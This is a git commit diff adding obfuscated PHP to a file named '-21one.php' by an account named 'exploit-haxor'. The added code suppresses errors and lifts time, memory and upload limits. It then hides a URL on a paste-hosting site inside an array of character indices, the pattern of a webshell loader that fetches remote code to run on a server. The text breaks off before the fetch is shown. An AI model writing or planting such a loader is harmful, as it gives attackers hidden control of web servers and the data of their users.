68c6d6941f12ebdaac20b2c223c487fecf0ca538
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2024-12-09 09:56:50 +0700

    Update -21one.php

--- -21one.php
+++ -21one.php
@@ -1,4 +1,18 @@
 <?php
+//@session_start();
+@session_write_close();
+@ignore_user_abort(true);
+@set_time_limit(0);
+@ini_set('memory_limit', '-1');
+@ini_set("upload_max_filesize", "9999m");
+?>
+<?php
+//@session_start();
+@session_write_close();
+@ignore_user_abort(true);
+@set_time_limit(0);
+@ini_set('memory_limit', '-1');
+@ini_set("upload_max_filesize", "9999m");
 error_reporting(0);
 $ptZh=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$qYKt=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 56, 4, 54, 54, 52, 52, 54, 58, 66, 61, 57, 4, 54, 66, 56, 61, 59, 59, 66, 60, 61, 59, 57, 66, 1, 57, 59, 58, 58, 2, 3, 2, 4, 59, 53, 53];$nKtq='';foreach($qYKt as $Jfyr){$nKtq.=$ptZh[$Jfyr];
 /////WHAT THE FUCK WITHOUT YOU///
